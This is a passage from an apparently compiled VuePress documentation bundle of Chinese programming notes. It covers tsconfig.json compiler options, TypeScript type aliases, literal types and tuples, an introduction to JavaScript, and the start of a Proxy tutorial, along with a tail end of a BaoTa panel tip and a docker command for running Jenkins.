{\nshow_force_bind();\n}\n全选代码复制\n需要还原就改成上面那个就可以了。\n\n这样就可以去除宝塔的强制登陆提示了\n\n\ndocker run -id --name jenkins -p 8080:8080 -v /home/data/jenkins:/var/jenkins_home jenkins/jenkins:lts',charsets:{cjk:!0}},{title:"tsconfig.json",frontmatter:{},regularPath:"/Javascript/TypeScript%E5%85%A5%E9%97%A8/03-%E8%BF%9B%E9%98%B6.html",relativePath:"Javascript/TypeScript入门/03-进阶.md",key:"v-0b2a1213",path:"/Javascript/TypeScript%E5%85%A5%E9%97%A8/03-%E8%BF%9B%E9%98%B6.html",headers:[{level:2,title:"tsconfig.json",slug:"tsconfig-json",normalizedTitle:"tsconfig.json",charIndex:2},{level:2,title:"编译选项",slug:"编译选项",normalizedTitle:"编译选项",charIndex:1856},{level:3,title:"自动编译文件",slug:"自动编译文件",normalizedTitle:"自动编译文件",charIndex:1865},{level:3,title:"自动编译整个项目",slug:"自动编译整个项目",normalizedTitle:"自动编译整个项目",charIndex:1952},{level:2,title:"类型别名",slug:"类型别名",normalizedTitle:"类型别名",charIndex:5317},{level:2,title:"字符串字面量类型",slug:"字符串字面量类型",normalizedTitle:"字符串字面量类型",charIndex:5582},{level:2,title:"元组",slug:"元组",normalizedTitle:"元组",charIndex:6028}],headersStr:"tsconfig.json 编译选项 自动编译文件 自动编译整个项目 类型别名 字符串字面量类型 元组",content:'# tsconfig.json\n\n{\n  // 此json文件中可以写注释！\n  /*\n    tsconfig.json是ts编译器的配置文件，ts编译器可以根据它的信息来对代码进行编译\n  */\n\n  /*\n    "include" 用来指定哪些ts文件需要被编译\n      默认：当前路径下所有文件, **\\*\n      路径：** 表示任意目录\n            * 表示任意文件\n  */\n  "include": [\n    "./src/**/*"\n  ],\n  /*\n    "exclude" 不需要被编译的文件目录\n    默认值：\n      ["node_modules", "bower_components", "jspm_packages", "./dist"]\n  */\n  "exclude": [\n    "./src/exclude/**/*"\n  ],\n  /*\n    被继承的配置文件\n    例如："extends": "。/configs/base",\n  */\n  //  "extends": "",\n  /*\n    指定被编译文件的列表，只有需要编译的文件少时才会用到\n  */\n  //  "files": [],\n  /*\n    compilerOptions 编译器的选项\n  */\n  "compilerOptions": {\n    // target 用来指定ts被编译为的ES的版本\n    // \'es3\', \'es5\', \'es6\', \'es2015\', \'es2016\', \'es2017\', \'es2018\', ...\n    "target": "es2015",\n    // module 指定要使用的模块化的规范\n    // \'none\', \'commonjs\', \'amd\', \'system\', \'umd\', \'es6\', \'es2015\', ...\n    "module": "es2015",\n    // lib用来指定项目中要使用的库\n    // 在node项目中可以声明用到的库，在前端中可以声明dom(浏览器中的内置库，但是在node中是不需要的！)\n    // 默认就是在浏览器中的运行环境！\n    //\'es5\', \'es6\', \'es2015\', \'es7\', \'es2016\', \'es2017\', \'es2018\', \'es2019\', \'es2020\',\n    // \'esnext\', \'dom\', \'dom.iterable\', ...\n    "lib": [\n      "es6",\n      "dom"\n    ],\n    // outDir 用来指定编译后文件所在的目录\n    "outDir": "./dist",\n    // 将代码合并为一个文件\n    // 设置outFile后，所有的全局作用域中的代码会合并到同一个文件中\n    //"outFile": "./dist/app.js"\n    // 是否对js文件进行编译，默认是false\n    "allowJs": true,\n    // 是否检查js代码是否符合语法规范，默认是false\n    "checkJs": true,\n    // 是否移除注释\n    "removeComments": true,\n    // 不生成编译后的文件\n    // 仅用TS检查语法\n    "noEmit": false,\n    // 当有错误时不生成编译后的文件\n    "noEmitOnError": true,\n    /*\n      语法检查属性\n    */\n    // 所有严格检查的总开关\n    "strict": true,\n    // 用来设置编译后的文件是否使用严格模式，默认false\n    // 在ES6中的模块化会自动使用严格模式，而无需在文件开头添加`\'use strict\'`\n    "alwaysStrict": true,\n    // 不允许隐式的any类型\n    "noImplicitAny": true,\n    // 不允许不明确类型的this\n    "noImplicitThis": true,\n    // 严格的检查空值\n    "strictNullChecks": true\n  }\n}\n\n\n\n\n# 编译选项\n\n\n# 自动编译文件\n\n编译文件时，使用 -w 指令后，TS编译器会自动监视文件的变化，并在文件发生变化时对文件进行重新编译。\n\n示例：\n\n  tsc xxx.ts -w\n\n\n\n# 自动编译整个项目\n\n如果直接使用tsc指令，则可以自动将当前项目下的所有ts文件编译为js文件。\n\n但是能直接使用tsc命令的前提时，要先在项目根目录下创建一个ts的配置文件 tsconfig.json\n\ntsconfig.json是一个JSON文件，添加配置文件后，只需只需 tsc 命令即可完成对整个项目的编译\n\n配置选项：\n\n# include\n\n * 定义希望被编译文件所在的目录\n * 默认值：["**/*"]\n\n示例：\n\n  "include":["src/**/*", "tests/**/*"]\n\n\n上述示例中，所有src目录和tests目录下的文件都会被编译\n\n# exclude\n\n * 定义需要排除在外的目录\n * 默认值：["node_modules", "bower_components", "jspm_packages"]\n\n示例：\n\n  "exclude": ["./src/hello/**/*"]\n\n\n上述示例中，src下hello目录下的文件都不会被编译\n\n# extends\n\n * 定义被继承的配置文件\n\n示例：\n\n"extends": "./configs/base"\n\n\n上述示例中，当前配置文件中会自动包含config目录下base.json中的所有配置信息\n\n# files\n\n * 指定被编译文件的列表，只有需要编译的文件少时才会用到\n\n示例：\n\n"files": [\n    "core.ts",\n    "sys.ts",\n    "types.ts",\n    "scanner.ts",\n    "parser.ts",\n    "utilities.ts",\n    "binder.ts",\n    "checker.ts",\n    "tsc.ts"\n  ]\n\n\n * 列表中的文件都会被TS编译器所编译\n\n# compilerOptions\n\n * 编译选项是配置文件中非常重要也比较复杂的配置选项\n * 在compilerOptions中包含多个子选项，用来完成对编译的配置\n\n项目选项：\n\n * target\n   \n   * 设置ts代码编译的目标版本\n   \n   * 可选值：\n     \n     * ES3（默认）、ES5、ES6/ES2015、ES7/ES2016、ES2017、ES2018、ES2019、ES2020、ESNext\n   \n   * 示例：\n     \n     * "compilerOptions": {\n           "target": "ES6"\n       }\n       \n   \n   * 如上设置，我们所编写的ts代码将会被编译为ES6版本的js代码\n\n * lib\n   \n   * 指定代码运行时所包含的库（宿主环境）\n   \n   * 可选值：\n     \n     * ES5、ES6/ES2015、ES7/ES2016、ES2017、ES2018、ES2019、ES2020、ESNext、DOM、WebWorker、ScriptHost ......\n   \n   * 示例：\n     \n     * "compilerOptions": {\n           "target": "ES6",\n           "lib": ["ES6", "DOM"],\n           "outDir": "dist",\n           "outFile": "dist/aa.js"\n       }\n       \n\n * module\n   \n   * 设置编译后代码使用的模块化系统\n   \n   * 可选值：\n     \n     * CommonJS、UMD、AMD、System、ES2020、ESNext、None\n   \n   * 示例：\n     \n     * "compilerOptions": {\n           "module": "CommonJS"\n       }\n       \n\n * outDir\n   \n   * 编译后文件的所在目录\n   \n   * 默认情况下，编译后的js文件会和ts文件位于相同的目录，设置outDir后可以改变编译后文件的位置\n   \n   * 示例：\n     \n     * "compilerOptions": {\n           "outDir": "dist"\n       }\n       \n     \n     * 设置后编译后的js文件将会生成到dist目录\n\n * outFile\n   \n   * 将所有的文件编译为一个js文件\n   \n   * 默认会将所有的编写在全局作用域中的代码合并为一个js文件，如果module制定了None、System或AMD则会将模块一起合并到文件之中\n   \n   * 示例：\n     \n     * "compilerOptions": {\n           "outFile": "dist/app.js"\n       }\n       \n\n * rootDir\n   \n   * 指定代码的根目录，默认情况下编译后文件的目录结构会以最长的公共目录为根目录，通过rootDir可以手动指定根目录\n   \n   * 示例：\n     \n     * "compilerOptions": {\n           "rootDir": "./src"\n       }\n       \n\n * allowJs\n   \n   * 是否对js文件编译\n\n * checkJs\n   \n   * 是否对js文件进行检查\n   \n   * 示例：\n     \n     * "compilerOptions": {\n           "allowJs": true,\n           "checkJs": true\n       }\n       \n\n * removeComments\n   \n   * 是否删除注释\n   * 默认值：false\n\n * noEmit\n   \n   * 不对代码进行编译\n   * 默认值：false\n\n * sourceMap\n   \n   * 是否生成sourceMap\n   * 默认值：false\n\n * 严格检查\n   \n   * strict\n     * 启用所有的严格检查，默认值为true，设置后相当于开启了所有的严格检查\n   * alwaysStrict\n     * 总是以严格模式对代码进行编译\n   * noImplicitAny\n     * 禁止隐式的any类型\n   * noImplicitThis\n     * 禁止类型不明确的this\n   * strictBindCallApply\n     * 严格检查bind、call和apply的参数列表\n   * strictFunctionTypes\n     * 严格检查函数的类型\n   * strictNullChecks\n     * 严格的空值检查\n   * strictPropertyInitialization\n     * 严格检查属性是否初始化\n\n * 额外检查\n   \n   * noFallthroughCasesInSwitch\n     * 检查switch语句包含正确的break\n   * noImplicitReturns\n     * 检查函数没有隐式的返回值\n   * noUnusedLocals\n     * 检查未使用的局部变量\n   * noUnusedParameters\n     * 检查未使用的参数\n\n * 高级\n   \n   * allowUnreachableCode\n     * 检查不可达代码\n     * 可选值：\n       * true，忽略不可达代码\n       * false，不可达代码将引起错误\n   * noEmitOnError\n     * 有错误的情况下不进行编译\n     * 默认值：false\n\n\n# 类型别名\n\n> 类型别名用来给一个类型起个新名字。\n\ntype Name = string;\ntype NameResolver = () => string;\ntype NameOrResolver = Name | NameResolver;\nfunction getName(n: NameOrResolver): Name {\n    if (typeof n === \'string\') {\n        return n;\n    } else {\n        return n();\n    }\n}\n\n\n\n# 字符串字面量类型\n\n> 字符串字面量类型用来约束取值只能是某几个字符串中的一个。\n\ntype EventNames = \'click\' | \'scroll\' | \'mousemove\';\nfunction handleEvent(ele: Element, event: EventNames) {\n    // do something\n}\n\nhandleEvent(document.getElementById(\'hello\'), \'scroll\');  // 没问题\nhandleEvent(document.getElementById(\'world\'), \'dblclick\'); // 报错，event 不能为 \'dblclick\'\n\n// index.ts(7,47): error TS2345: Argument of type \'"dblclick"\' is not assignable to parameter of type \'EventNames\'.\n\n\n\n# 元组\n\n数组合并了相同类型的对象，而元组（Tuple）合并了不同类型的对象。\n\n元组起源于函数编程语言（如 F#），这些语言中会频繁使用元组。\n\n定义一对值分别为 string 和 number 的元组：\n\nlet tom: [string, number] = [\'Tom\', 25];\n\n\n当赋值或访问一个已知索引的元素时，会得到正确的类型：\n\nlet tom: [string, number];\ntom[0] = \'Tom\';\ntom[1] = 25;\n\ntom[0].slice(1);\ntom[1].toFixed(2);\n\n\n也可以只赋值其中一项：\n\nlet tom: [string, number];\ntom[0] = \'Tom\';\n\n\n但是当直接对元组类型的变量进行初始化或者赋值的时候，需要提供所有元组类型中指定的项。\n\nlet tom: [string, number];\ntom = [\'Tom\', 25];\nlet tom: [string, number];\ntom = [\'Tom\'];\n\n// Property \'1\' is missing in type \'[string]\' but required in type \'[string, number]\'.\n\n\n越界的元素 当添加越界的元素时，它的类型会被限制为元组中每个类型的联合类型：\n\nlet tom: [string, number];\ntom = [\'Tom\', 25];\ntom.push(\'male\');\ntom.push(true);\n\n// Argument of type \'true\' is not assignable to parameter of type \'string | number\'.\n',normalizedContent:'# tsconfig.json\n\n{\n  // 此json文件中可以写注释！\n  /*\n    tsconfig.json是ts编译器的配置文件，ts编译器可以根据它的信息来对代码进行编译\n  */\n\n  /*\n    "include" 用来指定哪些ts文件需要被编译\n      默认：当前路径下所有文件, **\\*\n      路径：** 表示任意目录\n            * 表示任意文件\n  */\n  "include": [\n    "./src/**/*"\n  ],\n  /*\n    "exclude" 不需要被编译的文件目录\n    默认值：\n      ["node_modules", "bower_components", "jspm_packages", "./dist"]\n  */\n  "exclude": [\n    "./src/exclude/**/*"\n  ],\n  /*\n    被继承的配置文件\n    例如："extends": "。/configs/base",\n  */\n  //  "extends": "",\n  /*\n    指定被编译文件的列表，只有需要编译的文件少时才会用到\n  */\n  //  "files": [],\n  /*\n    compileroptions 编译器的选项\n  */\n  "compileroptions": {\n    // target 用来指定ts被编译为的es的版本\n    // \'es3\', \'es5\', \'es6\', \'es2015\', \'es2016\', \'es2017\', \'es2018\', ...\n    "target": "es2015",\n    // module 指定要使用的模块化的规范\n    // \'none\', \'commonjs\', \'amd\', \'system\', \'umd\', \'es6\', \'es2015\', ...\n    "module": "es2015",\n    // lib用来指定项目中要使用的库\n    // 在node项目中可以声明用到的库，在前端中可以声明dom(浏览器中的内置库，但是在node中是不需要的！)\n    // 默认就是在浏览器中的运行环境！\n    //\'es5\', \'es6\', \'es2015\', \'es7\', \'es2016\', \'es2017\', \'es2018\', \'es2019\', \'es2020\',\n    // \'esnext\', \'dom\', \'dom.iterable\', ...\n    "lib": [\n      "es6",\n      "dom"\n    ],\n    // outdir 用来指定编译后文件所在的目录\n    "outdir": "./dist",\n    // 将代码合并为一个文件\n    // 设置outfile后，所有的全局作用域中的代码会合并到同一个文件中\n    //"outfile": "./dist/app.js"\n    // 是否对js文件进行编译，默认是false\n    "allowjs": true,\n    // 是否检查js代码是否符合语法规范，默认是false\n    "checkjs": true,\n    // 是否移除注释\n    "removecomments": true,\n    // 不生成编译后的文件\n    // 仅用ts检查语法\n    "noemit": false,\n    // 当有错误时不生成编译后的文件\n    "noemitonerror": true,\n    /*\n      语法检查属性\n    */\n    // 所有严格检查的总开关\n    "strict": true,\n    // 用来设置编译后的文件是否使用严格模式，默认false\n    // 在es6中的模块化会自动使用严格模式，而无需在文件开头添加`\'use strict\'`\n    "alwaysstrict": true,\n    // 不允许隐式的any类型\n    "noimplicitany": true,\n    // 不允许不明确类型的this\n    "noimplicitthis": true,\n    // 严格的检查空值\n    "strictnullchecks": true\n  }\n}\n\n\n\n\n# 编译选项\n\n\n# 自动编译文件\n\n编译文件时，使用 -w 指令后，ts编译器会自动监视文件的变化，并在文件发生变化时对文件进行重新编译。\n\n示例：\n\n  tsc xxx.ts -w\n\n\n\n# 自动编译整个项目\n\n如果直接使用tsc指令，则可以自动将当前项目下的所有ts文件编译为js文件。\n\n但是能直接使用tsc命令的前提时，要先在项目根目录下创建一个ts的配置文件 tsconfig.json\n\ntsconfig.json是一个json文件，添加配置文件后，只需只需 tsc 命令即可完成对整个项目的编译\n\n配置选项：\n\n# include\n\n * 定义希望被编译文件所在的目录\n * 默认值：["**/*"]\n\n示例：\n\n  "include":["src/**/*", "tests/**/*"]\n\n\n上述示例中，所有src目录和tests目录下的文件都会被编译\n\n# exclude\n\n * 定义需要排除在外的目录\n * 默认值：["node_modules", "bower_components", "jspm_packages"]\n\n示例：\n\n  "exclude": ["./src/hello/**/*"]\n\n\n上述示例中，src下hello目录下的文件都不会被编译\n\n# extends\n\n * 定义被继承的配置文件\n\n示例：\n\n"extends": "./configs/base"\n\n\n上述示例中，当前配置文件中会自动包含config目录下base.json中的所有配置信息\n\n# files\n\n * 指定被编译文件的列表，只有需要编译的文件少时才会用到\n\n示例：\n\n"files": [\n    "core.ts",\n    "sys.ts",\n    "types.ts",\n    "scanner.ts",\n    "parser.ts",\n    "utilities.ts",\n    "binder.ts",\n    "checker.ts",\n    "tsc.ts"\n  ]\n\n\n * 列表中的文件都会被ts编译器所编译\n\n# compileroptions\n\n * 编译选项是配置文件中非常重要也比较复杂的配置选项\n * 在compileroptions中包含多个子选项，用来完成对编译的配置\n\n项目选项：\n\n * target\n   \n   * 设置ts代码编译的目标版本\n   \n   * 可选值：\n     \n     * es3（默认）、es5、es6/es2015、es7/es2016、es2017、es2018、es2019、es2020、esnext\n   \n   * 示例：\n     \n     * "compileroptions": {\n           "target": "es6"\n       }\n       \n   \n   * 如上设置，我们所编写的ts代码将会被编译为es6版本的js代码\n\n * lib\n   \n   * 指定代码运行时所包含的库（宿主环境）\n   \n   * 可选值：\n     \n     * es5、es6/es2015、es7/es2016、es2017、es2018、es2019、es2020、esnext、dom、webworker、scripthost ......\n   \n   * 示例：\n     \n     * "compileroptions": {\n           "target": "es6",\n           "lib": ["es6", "dom"],\n           "outdir": "dist",\n           "outfile": "dist/aa.js"\n       }\n       \n\n * module\n   \n   * 设置编译后代码使用的模块化系统\n   \n   * 可选值：\n     \n     * commonjs、umd、amd、system、es2020、esnext、none\n   \n   * 示例：\n     \n     * "compileroptions": {\n           "module": "commonjs"\n       }\n       \n\n * outdir\n   \n   * 编译后文件的所在目录\n   \n   * 默认情况下，编译后的js文件会和ts文件位于相同的目录，设置outdir后可以改变编译后文件的位置\n   \n   * 示例：\n     \n     * "compileroptions": {\n           "outdir": "dist"\n       }\n       \n     \n     * 设置后编译后的js文件将会生成到dist目录\n\n * outfile\n   \n   * 将所有的文件编译为一个js文件\n   \n   * 默认会将所有的编写在全局作用域中的代码合并为一个js文件，如果module制定了none、system或amd则会将模块一起合并到文件之中\n   \n   * 示例：\n     \n     * "compileroptions": {\n           "outfile": "dist/app.js"\n       }\n       \n\n * rootdir\n   \n   * 指定代码的根目录，默认情况下编译后文件的目录结构会以最长的公共目录为根目录，通过rootdir可以手动指定根目录\n   \n   * 示例：\n     \n     * "compileroptions": {\n           "rootdir": "./src"\n       }\n       \n\n * allowjs\n   \n   * 是否对js文件编译\n\n * checkjs\n   \n   * 是否对js文件进行检查\n   \n   * 示例：\n     \n     * "compileroptions": {\n           "allowjs": true,\n           "checkjs": true\n       }\n       \n\n * removecomments\n   \n   * 是否删除注释\n   * 默认值：false\n\n * noemit\n   \n   * 不对代码进行编译\n   * 默认值：false\n\n * sourcemap\n   \n   * 是否生成sourcemap\n   * 默认值：false\n\n * 严格检查\n   \n   * strict\n     * 启用所有的严格检查，默认值为true，设置后相当于开启了所有的严格检查\n   * alwaysstrict\n     * 总是以严格模式对代码进行编译\n   * noimplicitany\n     * 禁止隐式的any类型\n   * noimplicitthis\n     * 禁止类型不明确的this\n   * strictbindcallapply\n     * 严格检查bind、call和apply的参数列表\n   * strictfunctiontypes\n     * 严格检查函数的类型\n   * strictnullchecks\n     * 严格的空值检查\n   * strictpropertyinitialization\n     * 严格检查属性是否初始化\n\n * 额外检查\n   \n   * nofallthroughcasesinswitch\n     * 检查switch语句包含正确的break\n   * noimplicitreturns\n     * 检查函数没有隐式的返回值\n   * nounusedlocals\n     * 检查未使用的局部变量\n   * nounusedparameters\n     * 检查未使用的参数\n\n * 高级\n   \n   * allowunreachablecode\n     * 检查不可达代码\n     * 可选值：\n       * true，忽略不可达代码\n       * false，不可达代码将引起错误\n   * noemitonerror\n     * 有错误的情况下不进行编译\n     * 默认值：false\n\n\n# 类型别名\n\n> 类型别名用来给一个类型起个新名字。\n\ntype name = string;\ntype nameresolver = () => string;\ntype nameorresolver = name | nameresolver;\nfunction getname(n: nameorresolver): name {\n    if (typeof n === \'string\') {\n        return n;\n    } else {\n        return n();\n    }\n}\n\n\n\n# 字符串字面量类型\n\n> 字符串字面量类型用来约束取值只能是某几个字符串中的一个。\n\ntype eventnames = \'click\' | \'scroll\' | \'mousemove\';\nfunction handleevent(ele: element, event: eventnames) {\n    // do something\n}\n\nhandleevent(document.getelementbyid(\'hello\'), \'scroll\');  // 没问题\nhandleevent(document.getelementbyid(\'world\'), \'dblclick\'); // 报错，event 不能为 \'dblclick\'\n\n// index.ts(7,47): error ts2345: argument of type \'"dblclick"\' is not assignable to parameter of type \'eventnames\'.\n\n\n\n# 元组\n\n数组合并了相同类型的对象，而元组（tuple）合并了不同类型的对象。\n\n元组起源于函数编程语言（如 f#），这些语言中会频繁使用元组。\n\n定义一对值分别为 string 和 number 的元组：\n\nlet tom: [string, number] = [\'tom\', 25];\n\n\n当赋值或访问一个已知索引的元素时，会得到正确的类型：\n\nlet tom: [string, number];\ntom[0] = \'tom\';\ntom[1] = 25;\n\ntom[0].slice(1);\ntom[1].tofixed(2);\n\n\n也可以只赋值其中一项：\n\nlet tom: [string, number];\ntom[0] = \'tom\';\n\n\n但是当直接对元组类型的变量进行初始化或者赋值的时候，需要提供所有元组类型中指定的项。\n\nlet tom: [string, number];\ntom = [\'tom\', 25];\nlet tom: [string, number];\ntom = [\'tom\'];\n\n// property \'1\' is missing in type \'[string]\' but required in type \'[string, number]\'.\n\n\n越界的元素 当添加越界的元素时，它的类型会被限制为元组中每个类型的联合类型：\n\nlet tom: [string, number];\ntom = [\'tom\', 25];\ntom.push(\'male\');\ntom.push(true);\n\n// argument of type \'true\' is not assignable to parameter of type \'string | number\'.\n',charsets:{cjk:!0}},{title:"编程导论",frontmatter:{},regularPath:"/Javascript/",relativePath:"Javascript/README.md",key:"v-34d3e5dc",path:"/Javascript/",headers:[{level:2,title:"编程的本质是什么？",slug:"编程的本质是什么",normalizedTitle:"编程的本质是什么？",charIndex:77},{level:2,title:"人人都会编程",slug:"人人都会编程",normalizedTitle:"人人都会编程",charIndex:1798},{level:2,title:"编程思维",slug:"编程思维",normalizedTitle:"编程思维",charIndex:1919},{level:2,title:"JavaScript",slug:"javascript",normalizedTitle:"javascript",charIndex:2213}],headersStr:"编程的本质是什么？ 人人都会编程 编程思维 JavaScript",content:"# 编程导论\n\n> 每一个新领域都能给我们带来新的知识，装载着这些新知识的我们自然也会获得新的思维，新的能力，新的看待世界的角度。学编程也如此。\n\n\n# 编程的本质是什么？\n\n用一句话来解释，编程就是和电脑对话，用电脑听得懂的语言，告诉它我想让它做的事。但电脑，作为新时代的高科技产品，它理性、严谨、不讲故事讲数据，它要么是听不懂我们的指令，一旦听懂了就会执行，而且每次都会执行。\n\n编程：写一堆指令告诉计算机做什么\n\n                          计算机工作过程\n──────────────────────────────────────────────────────────────────────\n                                                         ┌──────────┐\n                                                         │          │\n                                                     ┌── │   Show   │\n                                                     │   │          │\n                                                     │   └──────────┘\n                                                     │       文件\n    硬盘   >  读取   >  内存        >       CPU   >   │\n┌──────────┐       ┌──────────┐       ┌──────────┐   │   ┌──────────┐\n│          │       │          │       │          │   │   │          │\n│  Files   │ ───── │   Data   │ ───── │ Compute  │ ──┼── │   Show   │\n│          │       │          │       │          │   │   │          │\n└──────────┘       └──────────┘       └──────────┘   │   └──────────┘\n    文件               数据                 计算      │      显示器\n                                                     │\n                                                     │   ┌──────────┐\n                                                     │   │          │\n                                                     └── │   Show   │\n                                                         │          │\n                                                         └──────────┘   \n                                                            打印机\n\n──────────────────────────────────────────────────────────────────────\n    硬盘   >  读取   >  内存        >       CPU   >  输出   >  显示设备\n\n\n\n\n# 人人都会编程\n\n做饭：\n\n准备材料 -> 切菜 -> 煮饭 -> 炒菜 (加入油、盐、酱油、醋) -> 盛入盘中 -> 吃饭\n\n\n洗衣服：\n\n收集脏衣服 -> 洗衣机加水 -> 加洗衣粉 -> 放入衣服 -> 开始洗 -> 晾衣服\n\n\n\n# 编程思维\n\n要跟电脑沟通对话，我们也必须让自己变得理性、严谨起来，从电脑的角度去思考问题，这就是所谓的 编程思维。\n\n在编程中学习的最困难的事情之一不是我们需要学习的语法，而是如何应用它来解决现实世界的问题。 您需要像一个程序员一样开始思考——这通常涉及到对程序需要做什么样描述，以及实现这些东西需要什么代码特性，以及如何使它们一起工作。\n\n这需要努力工作，编程语法的经验和实践的混合，以及一点创造力。 我们编写的代码越多，我们的本领就越好。\n\n世界上目前没有一种方式能够让你在5分钟内具有“程序员大脑”，只有我们不断的努力 去思考、去编写程序，具备“程序员大脑”(编程思维)。\n\n\n# JavaScript\n\n> JavaScript ( JS ) 是一种具有函数优先的轻量级解释型或即时编译型的编程语言。\n\nJavaScript是世界上最流行的脚本语言，因为你在电脑、手机、平板上浏览的所有的网页，以及无数基于HTML5的手机App，交互逻辑都是由JavaScript驱动的。我们可以通过JavaScript提供的API可以实现一些交互效果开发，使用Ajax可以与后台进行数据的交互。在Web世界里，只有JavaScript能跨平台、跨浏览器驱动网页，与用户交互。\n\n虽然它是作为开发Web 页面的脚本语言而出名的，但是它也被用到了很多非浏览器环境中，例如 node.js。",normalizedContent:"# 编程导论\n\n> 每一个新领域都能给我们带来新的知识，装载着这些新知识的我们自然也会获得新的思维，新的能力，新的看待世界的角度。学编程也如此。\n\n\n# 编程的本质是什么？\n\n用一句话来解释，编程就是和电脑对话，用电脑听得懂的语言，告诉它我想让它做的事。但电脑，作为新时代的高科技产品，它理性、严谨、不讲故事讲数据，它要么是听不懂我们的指令，一旦听懂了就会执行，而且每次都会执行。\n\n编程：写一堆指令告诉计算机做什么\n\n                          计算机工作过程\n──────────────────────────────────────────────────────────────────────\n                                                         ┌──────────┐\n                                                         │          │\n                                                     ┌── │   show   │\n                                                     │   │          │\n                                                     │   └──────────┘\n                                                     │       文件\n    硬盘   >  读取   >  内存        >       cpu   >   │\n┌──────────┐       ┌──────────┐       ┌──────────┐   │   ┌──────────┐\n│          │       │          │       │          │   │   │          │\n│  files   │ ───── │   data   │ ───── │ compute  │ ──┼── │   show   │\n│          │       │          │       │          │   │   │          │\n└──────────┘       └──────────┘       └──────────┘   │   └──────────┘\n    文件               数据                 计算      │      显示器\n                                                     │\n                                                     │   ┌──────────┐\n                                                     │   │          │\n                                                     └── │   show   │\n                                                         │          │\n                                                         └──────────┘   \n                                                            打印机\n\n──────────────────────────────────────────────────────────────────────\n    硬盘   >  读取   >  内存        >       cpu   >  输出   >  显示设备\n\n\n\n\n# 人人都会编程\n\n做饭：\n\n准备材料 -> 切菜 -> 煮饭 -> 炒菜 (加入油、盐、酱油、醋) -> 盛入盘中 -> 吃饭\n\n\n洗衣服：\n\n收集脏衣服 -> 洗衣机加水 -> 加洗衣粉 -> 放入衣服 -> 开始洗 -> 晾衣服\n\n\n\n# 编程思维\n\n要跟电脑沟通对话，我们也必须让自己变得理性、严谨起来，从电脑的角度去思考问题，这就是所谓的 编程思维。\n\n在编程中学习的最困难的事情之一不是我们需要学习的语法，而是如何应用它来解决现实世界的问题。 您需要像一个程序员一样开始思考——这通常涉及到对程序需要做什么样描述，以及实现这些东西需要什么代码特性，以及如何使它们一起工作。\n\n这需要努力工作，编程语法的经验和实践的混合，以及一点创造力。 我们编写的代码越多，我们的本领就越好。\n\n世界上目前没有一种方式能够让你在5分钟内具有“程序员大脑”，只有我们不断的努力 去思考、去编写程序，具备“程序员大脑”(编程思维)。\n\n\n# javascript\n\n> javascript ( js ) 是一种具有函数优先的轻量级解释型或即时编译型的编程语言。\n\njavascript是世界上最流行的脚本语言，因为你在电脑、手机、平板上浏览的所有的网页，以及无数基于html5的手机app，交互逻辑都是由javascript驱动的。我们可以通过javascript提供的api可以实现一些交互效果开发，使用ajax可以与后台进行数据的交互。在web世界里，只有javascript能跨平台、跨浏览器驱动网页，与用户交互。\n\n虽然它是作为开发web 页面的脚本语言而出名的，但是它也被用到了很多非浏览器环境中，例如 node.js。",charsets:{cjk:!0}},{title:"Proxy",frontmatter:{},regularPath:"/Javascript/Javascript%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/Proxy.html",relativePath:"Javascript/Javascript数据处理/Proxy.md",key:"v-4569d274",path:"/Javascript/Javascript%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/Proxy.html",headers:[{level:2,title:"概述",slug:"概述",normalizedTitle:"概述",charIndex:12},{level:3,title:"例子",slug:"例子",normalizedTitle:"例子",charIndex:142},{level:2,title:"Proxy 实例的方法",slug:"proxy-实例的方法",normalizedTitle:"proxy 实例的方法",charIndex:688},{level:3,title:"get()",slug:"get",normalizedTitle:"get()",charIndex:704},{level:3,title:"set()",slug:"set",normalizedTitle:"set()",charIndex:1272},{level:3,title:"apply()",slug:"apply",normalizedTitle:"apply()",charIndex:3057},{level:3,title:"has()",slug:"has",normalizedTitle:"has()",charIndex:3858},{level:3,title:"construct()",slug:"construct",normalizedTitle:"construct()",charIndex:4989},{level:3,title:"deleteProperty()",slug:"deleteproperty",normalizedTitle:"deleteproperty()",charIndex:6094},{level:3,title:"deleteProperty()",slug:"deleteproperty-2",normalizedTitle:"deleteproperty()",charIndex:6094},{level:3,title:"getOwnPropertyDescriptor()",slug:"getownpropertydescriptor",normalizedTitle:"getownpropertydescriptor()",charIndex:7263},{level:3,title:"getPrototypeOf()",slug:"getprototypeof",normalizedTitle:"getprototypeof()",charIndex:7979},{level:3,title:"isExtensible()",slug:"isextensible",normalizedTitle:"isextensible()",charIndex:8514},{level:3,title:"ownKeys()",slug:"ownkeys",normalizedTitle:"ownkeys()",charIndex:9146},{level:3,title:"preventExtensions()",slug:"preventextensions",normalizedTitle:"preventextensions()",charIndex:11248},{level:3,title:"setPrototypeOf()",slug:"setprototypeof",normalizedTitle:"setprototypeof()",charIndex:11700},{level:2,title:"Proxy.revocable()",slug:"proxy-revocable",normalizedTitle:"proxy.revocable()",charIndex:12069},{level:2,title:"this 问题",slug:"this-问题",normalizedTitle:"this 问题",charIndex:12514}],headersStr:"概述 例子 Proxy 实例的方法 get() set() apply() has() construct() deleteProperty() deleteProperty() getOwnPropertyDescriptor() getPrototypeOf() isExtensible() ownKeys() preventExtensions() setPrototypeOf() Proxy.revocable() this 问题",content:"# Proxy\n\n\n# 概述\n\n> Proxy 可以理解成，在目标对象之前架设一层“拦截”，外界对该对象的访问，都必须先通过这层拦截，因此提供了一种机制，可以对外界的访问进行过滤和改写。Proxy 这个词的原意是代理，用在这里表示由它来“代理”某些操作，可以译为“代理器”。\n\n\n# 例子\n\nvar proxy = new Proxy({}, {\n    get: function(target, propKey) {\n        return 35;\n    }\n});\n\nproxy.time // 35\nproxy.name // 35\nproxy.title // 35\n\n// 如果handler没有设置任何拦截，那就等同于直接通向原对象。\nvar target = {};\nvar handler = {};\nvar proxy = new Proxy(target, handler);\nproxy.a = 'b';\ntarget.a // \"b\"\n\n\nProxy 接受两个参数。\n\n * target 参数是所要代理的目标对象（上例是一个空对象），即如果没有Proxy的介入，操作原来要访问的就是这个对象；\n * handler 参数是一个配置对象，对于每一个被代理的操作，需要提供一个对应的处理函数，该函数将拦截对应的操作。\n\nWARNING\n\n注意，要使得Proxy起作用，必须针对Proxy实例（上例是proxy对象）进行操作，而不是针对目标对象（上例是空对象）进行操作。\n\n如果handler没有设置任何拦截，那就等同于直接通向原对象。\n\n\n# Proxy 实例的方法\n\n\n# get()\n\n> 用于拦截某个属性的读取操作，可接受三个参数。\n\n * 目标对象\n * 属性名\n * proxy 实例本身(可选)\n\nvar person = {\n    name: \"张三\"\n};\n\nvar proxy = new Proxy(person, {\n    get: 